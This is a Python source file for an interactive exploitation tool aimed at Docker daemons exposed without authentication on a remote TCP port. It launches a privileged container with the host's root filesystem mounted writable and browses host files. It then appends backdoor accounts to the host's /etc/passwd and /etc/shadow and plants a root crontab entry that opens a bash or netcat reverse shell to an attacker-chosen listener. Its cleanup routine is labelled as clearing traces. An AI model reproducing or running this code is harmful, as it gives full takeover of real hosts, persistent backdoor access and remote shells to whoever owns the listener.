from prompt_toolkit import PromptSession
from tabulate import tabulate
import signal
import docker
import click
from menu import BANNER, MENU_IMAGE, MENU_EXPLOIT, MENU_CRONTAB


class DockerManger(docker.DockerClient):
    def __init__(self):
        super().__init__()
        self.container = None

    def connect(self, host: str, port: str | int):
        self.client = docker.DockerClient(base_url="tcp://{host}:{port}".format(host=host, port=port))

    def get_images(self):
        images = self.images.list()
        return images

    def get_containers(self):
        containers = self.client.containers.list(all=True)
        return containers

    def container_start(self, image_ID: str):
        container_params = {
            "image": image_ID,  # 替换为你想要启动的Docker镜像的名称和标签
            "command": "sleep infinity",  # 替换为要在容器内运行的命令
            "detach": True,  # 设置为True以在后台运行容器
            "volumes": {"/": {"bind": "/tmp/host-dir", "mode": "rw"}},  # 设置将宿主机的主目录挂载进容器的/tmp/host-dir目录
            "privileged": True,  # 启用容器的特权模式
            "remove": True,  # 设置容器在停止后自动删除
        }
        self.container = self.client.containers.run(**container_params)
        print(self.container.id[0:12])

    def container_clean(self):
        if self.container:
            self.container.stop()

    def container_exec(self, command: str):
        print(command)
        exec_res = self.container.exec_run(cmd=command)
        if exec_res[0] == 0:
            exec_res = exec_res[1].decode("utf-8")
            return exec_res

    def container_filebrowser(self):
        container_file_session = PromptSession()
        while True:
            user_input = container_file_session.prompt("Host dir, 'q' to quit: ", default="")
            if user_input != "q":
                exec_res = self.container.exec_run(cmd="ls -lh /tmp/host-dir{}".format(user_input))
                if exec_res[0] == 0:
                    files = exec_res[1].decode("utf-8").split("\n")
                    # 列出/tmp目录下的所有文件
                    for file in files:
                        print(file)
            else:
                break

    def print_basicinfo(self):
        print("Listing containers")
        print(
            tabulate(
                [
                    [
                        container.id[0:12],
                        "<service> " + container.name.split(".")[0] if "." in container.name else container.name,
                        container.image.tags[0],
                        container.status,
                    ]
                    for container in self.get_containers()
                ],
                headers=["ID", "Name", "Tag", "Status"],
                tablefmt="fancy_grid",
            )
        )
        print("Listing Images")
        print(
            tabulate(
                [
                    [
                        image.id.split(":")[1][0:12],
                        image.tags,
                    ]
                    for image in self.get_images()
                ],
                headers=["Image ID", "Image Tag"],
                tablefmt="fancy_grid",
            )
        )


def signal_handler(sig, frame):
    print("Clearing traces.")
    docker_client.container_clean()
    print("Exiting gracefully.")
    exit(0)


def generater_crontab(mode: str, host: str, port: str | int):
    res = "*/1 * * * * root "
    match mode:
        case "bash":
            res += "bash -i >& /dev/tcp/{host}/{port} 0>&1".format(host=host, port=port)
        case "netcat":
            res += "nc -e /bin/sh {host} {port}".format(host=host, port=port)

    return res


@click.command()
@click.option("--host", "-H", help="Host of Docker Service", show_default=True)
@click.option("--port", "-P", default=2375, help="Port of Docker service, default is 2375 ")
def main(host: str, port: str | int):
    if not host:
        click.echo(click.get_current_context().get_help())
        exit()
    click.echo("Host: {host}\nPort: {port}".format(host=host, port=port))
    # Check host and port format
    if len(host.split(".")) != 4:
        print("Error: Host format error")
        exit()
    for _tmp in [i for i in host.split(".")]:
        if len(_tmp) > 3 or not _tmp.isnumeric() or int(_tmp) not in range(0, 256):
            print("Error: Host format error")
            exit()
    try:
        docker_client.connect(host=host, port=port)
    except:
        print("Docker connect Error!")
    docker_client.print_basicinfo()
    # Select which image to use
    match input(MENU_IMAGE):
        case "1":
            image_id = input("Input image ID: ")
            if image_id not in [image.id.split(":")[1][0:12] for image in docker_client.get_images()]:
                print("Image ID not exist in remote docker")
                exit()
            docker_client.container_start(image_id)
    while True:
        match input(MENU_EXPLOIT):
            case "1":
                docker_client.container_filebrowser()

            case "2":
                with open("./payload/backdoruser-passwd", "r") as f:
                    data = f.read()
                    print(docker_client.container_exec('echo "{}" >> /tmp/host-dir/etc/passwd'.format(data)))
                with open("./payload/backdoruser-shadow", "r") as f:
                    data = f.read()
                    print(docker_client.container_exec('echo "{}" >> /tmp/host-dir/etc/shadow'.format(data)))
            case "3":
                match input(MENU_CRONTAB):
                    case "1":
                        payload = generater_crontab("bash", input("Listener Host: "), input("Listener Port: "))
                        print("payload: " + payload)
                        print(docker_client.container_exec("bash -c 'echo \"{}\" >> /tmp/host-dir/etc/crontab'".format(payload)))
            case "q":
                break
            case _:
                print("What?")
                continue

    docker_client.container_clean()


if __name__ == "__main__":
    # Init docker client
    docker_client = DockerManger()
    signal.signal(signal.SIGINT, signal_handler)
    print(BANNER)
    main()
